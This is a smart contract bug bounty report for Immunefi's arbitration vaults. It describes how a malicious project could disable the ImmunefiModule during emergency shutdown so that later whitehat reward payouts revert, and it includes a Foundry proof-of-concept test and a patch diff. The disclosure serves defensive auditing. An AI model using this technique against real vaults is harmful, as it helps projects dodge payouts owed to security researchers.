# 29432 - \[SC - Low] Malicious project can grief reward payouts from...

Submitted on Mar 18th 2024 at 18:18:42 UTC by @marchev for [Boost | Immunefi Arbitration](https://immunefi.com/bounty/immunefiarbitration-boost/)

Report ID: #29432

Report type: Smart Contract

Report severity: Low

Target: <https://github.com/immunefi-team/vaults/blob/main/src/guards/ScopeGuard.sol>

Impacts:

* Contract fails to deliver promised returns, but doesn't lose value

## Description

## Brief/Intro

When the emergency shutdown mode is activated, `ImmunefiGuard` enables vault owners to perform **any** action on their Gnosis Safe, including adding or removing guards and modules. This presents a vulnerability where a malicious vault owner could disable the `ImmunefiModule`. Consequently, when emergency shutdown mode is turned off, attempts to payout rewards to whitehats via the Arbitration system would revert.

## Vulnerability Details

The protocol features a singleton `EmergencySystem`. Activation of the emergency shutdown mode affects all vaults, enabling unrestricted action by vault owners.

This is highlighted in the `ImmunefiGuard#checkTransaction()` function, which during an emergency permits any transaction:

```sol
    function checkTransaction(
        // ...
    ) public view override {
        // ...
        
        if (emergencySystem.emergencyShutdownActive()) { //@audit This allows **any** function to be executed by vault owner in case emergency shutdown mode is active.
            return;
        }

        // ...
    }
```

Such design permits the removal of critical components like `ImmunefiGuard` and `ImmunefiModule`, undermining protocol integrity and security post-emergency. It is worth noting the `EmergencySystem` also allows deactivation of the emergency mode once issues are addressed (via `deactivateEmergencyShutdown()`), intending for the protocol to resume normal operations with its core invariants remaining intact.

The current capability to remove core component for the protocol violates this intent and poses a significant security risk.

Here's how the vulnerability could be misused:

1. The protocol owner activates the emergency shutdown.
2. A malicious project takes advantage of the vulnerability and removes `ImmunefiGuard` and `ImmunefiModule` from their vault.
3. The protocol owner deactivates the emergency mode.
4. A whitehat requests an arbitration.
5. An arbiter rules in favor of the whitehat, triggering a reward payout and attempts to enforce reward payout.
6. The reward payout gets reverted since the `RewardSystem` attempts to force the payour via the `ImmunefiModule` which has been disabled by the malicious project for their vault.

## Impact Details

The core components, `ImmunefiGuard` and `ImmunefiModule`, ensure compliance with arbitration decisions.

Removing or disabling the `ImmunefiModule` component enables a malicious project to evade payouts determined by arbitration, leading to financial losses for whitehats.

Additionally, by being able to remove the `ImmunefiGuard` during the emergency shutdown mode, a malicious project now can freely execute any action on their vault without any limitations which also breaks core invariants of the Arbitration system.

## Solution

The `ImmunefiGuard` can be modified as follows to let vault owners execute any function during an emergency exit, except for adding or removing guards and modules:

```diff
diff --git a/src/guards/ImmunefiGuard.sol b/src/guards/ImmunefiGuard.sol
index e17b40d..3e6fe70 100644
--- a/src/guards/ImmunefiGuard.sol
+++ b/src/guards/ImmunefiGuard.sol
@@ -64,7 +64,12 @@ contract ImmunefiGuard is ScopeGuard, IImmunefiGuardEvents {
         // if the system is shutdown, guard logic is detached
         // project can use as a vanilla safe
         if (emergencySystem.emergencyShutdownActive()) {
-            return;
+            bytes4 funcSig = bytes4(data);
+            if (funcSig != /* setGuard(address) */ 0xe19a9dd9  &&
+                funcSig != /* enableModule(address) */ 0x610b5925  &&
+                funcSig != /* disableModule(address,address)*/ 0xe009cfde) {
+                return;
+            }
         }

         if (guardBypassers[msgSender]) {
```

The ability to add/remove guards is not critical in case of emergency, especially given the fact that the Emergency System bypasses both the `ImmunefiModule` and the `ImmunefiGuard`. Moreover, it is imperative that Immunefi vaults are used solely for the purposes of reward distribution for bug bounty programs at Immunefi. Thus, blocking the ability to add/remove modules/guards does not affect the ability of the protocol to withdraw their funds or perform other critical functions in case of an emergency.

## References

<https://github.com/immunefi-team/vaults/blob/49c1de26cda19c9e8a4aa311ba3b0dc864f34a25/src/guards/ImmunefiGuard.sol#L66-L68>

## Proof of Concept

The vulnerability could be reproduced by modifying the `Arbitration.t.sol` file and adding the following test to it.

The implemented scenario demonstrates how a malicous project could disable their vault's `ImmunefiModule` during emergency which later on results in revert of payouts which are attempted by the Arbitration system.

```sol
    function testMaliciousProjectCanCauseSendRewardToFailAfterEmergencyShutdown() public {
        // 0. Set right permissions on moduleGuard
        vm.startPrank(protocolOwner);
        moduleGuard.setTargetAllowed(address(vaultDelegate), true);
        moduleGuard.setAllowedFunction(address(vaultDelegate), vaultDelegate.sendTokens.selector, true);
        moduleGuard.setDelegateCallAllowedOnTarget(address(vaultDelegate), true);

        moduleGuard.setTargetAllowed(address(vaultDelegate), true);
        moduleGuard.setAllowedFunction(address(vaultDelegate), vaultDelegate.sendReward.selector, true);
        moduleGuard.setDelegateCallAllowedOnTarget(address(vaultDelegate), true);
        vm.stopPrank();

        // 0. Arbitration ref ID
        uint96 referenceId = 1;

        // 0. Mint feeAmount of feeToken to whitehat
        ERC20PresetMinterPauser token = ERC20PresetMinterPauser(address(arbitration.feeToken()));
        vm.startPrank(protocolOwner);
        token.mint(whitehat, arbitration.feeAmount());
        vm.stopPrank();

        // 1. Protocol owner enables emergency shutdown since a critical issue was found in the Arbitration protocol
        vm.prank(protocolOwner);
        emergencySystem.activateEmergencyShutdown();

        bytes memory disableImmunefiModuleHashData = vault.encodeTransactionData({
            to: address(vault),
            value: 0,
            data: abi.encodeCall(vault.disableModule, (address(0x1), address(immunefiModule))),
            operation: Enum.Operation.Call,
            safeTxGas: 0,
            baseGas: 0,
            gasPrice: 0,
            gasToken: address(0),
            refundReceiver: address(0),
            _nonce: vault.nonce()
        });

        bytes memory disableImmunefiModuleSignature = _signData(vaultSignerPk, disableImmunefiModuleHashData);

        // 2. Malicious project disables the ImmunefiModule since ImmunefiGuard allows **any** transaction on the vault.
        vault.execTransaction(
            address(vault),
            0,
            abi.encodeCall(vault.disableModule, (address(0x1), address(immunefiModule))),
            Enum.Operation.Call,
            0,
            0,
            0,
            address(0),
            payable(0),
            disableImmunefiModuleSignature
        );

        // 3. Critical issue gets fixed/resolved and protocol owner deactivates emergency shutdown.
        vm.prank(protocolOwner);
        emergencySystem.deactivateEmergencyShutdown();

        // 4. Whitehat approves spending the fee amount for an arbitration.
        vm.startPrank(whitehat);
        token.approve(address(arbitration), arbitration.feeAmount());
        vm.stopPrank();

        // 5. Whitehat signs request for arbitration
        bytes memory signature = _signData(
            whitehatPk,
            arbitration.encodeRequestArbFromWhitehatData(referenceId, address(vault))
        );

        // 6. Whitehat requests arbitration and pays the fee.
        vm.prank(whitehat);
        arbitration.requestArbWhitehat(referenceId, address(vault), whitehat, signature);

        vm.deal(address(vault), 110 ether);
        bytes32 arbitrationId = arbitration.computeArbitrationId(referenceId, address(vault), whitehat);

        // 7. Arbiter enforces sending reward to the whitehat.
        //    The txn fails since the malicious project has disabled ImmunefiModule which results in GS104 error.
        vm.startPrank(arbiter);
        arbitration.enforceSendRewardWhitehat(
            arbitrationId,
            new Rewards.ERC20Reward[](0),
            100 ether,
            vaultDelegate.UNTRUSTED_TARGET_GAS_CAP(),
            true
        );
        vm.stopPrank();
    }
```

Run the PoC via:

```sh
forge test --mt "testMaliciousProjectCanCauseSendRewardToFailAfterEmergencyShutdown" -vvvvv
```
